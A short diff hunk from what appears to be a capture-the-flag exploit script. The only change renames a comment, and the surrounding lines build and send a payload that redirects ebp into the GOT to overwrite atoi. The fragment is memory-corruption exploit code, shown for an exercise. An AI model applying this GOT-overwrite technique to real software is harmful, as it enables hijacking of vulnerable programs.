@@ -70,7 +70,7 @@ s.recv()
 
 iphone8()
 # delete to set ebp value point to GOT when leaving delete() function
-# ebp in GOT
+# ebp_in_GOT
 payload6 = p32(0x0804b033) + "\x00"*4 + p32(ebp_delete - 0xc) + p32(got_atoi + 0x22)
 s.sendline(payload6)
 s.recv()
